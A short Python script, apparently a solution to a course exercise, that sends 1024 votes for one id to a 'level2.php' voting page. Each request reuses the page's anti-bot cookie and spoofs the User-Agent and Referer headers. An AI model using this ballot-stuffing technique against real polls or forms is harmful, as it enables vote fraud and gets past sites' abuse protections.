#!/usr/bin/python3
import requests


for i in range(1024):
    r = requests.get("http://158.69.76.135/level2.php")
    galleta = r.cookies['HoldTheDoor']
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0', 'Referer': 'http://158.69.76.135/level2.php'}

    payload = {'id': 766, 'holdthedoor': 'Submit', 'key': galleta}
    r1 = requests.post("http://158.69.76.135/level2.php", data=payload,
                    cookies={'HoldTheDoor': galleta}, headers=headers)
